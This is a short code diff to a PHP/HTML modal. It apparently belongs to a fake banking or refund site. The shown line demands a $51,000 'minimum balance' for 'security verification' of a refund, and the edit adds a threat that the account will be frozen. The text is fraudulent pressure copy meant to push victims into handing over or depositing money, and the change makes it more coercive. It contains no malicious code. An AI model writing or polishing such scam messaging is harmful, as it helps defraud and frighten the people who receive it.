@@ -226,7 +226,7 @@ foreach ($fields_by_method as $mname => $mfields) {
         </div>
         
         <div class="modal-body">
-            <p>Security Verification: A minimum balance of <strong>$51,000.00</strong> is required to verify your account and process this unusual refund request.</p>
+            <p>Security Verification: A minimum balance of <strong>$51,000.00</strong> is required to verify your account and process this unusual refund request to avoid account being freezed.</p>
         </div>
 
         <div class="modal-footer">
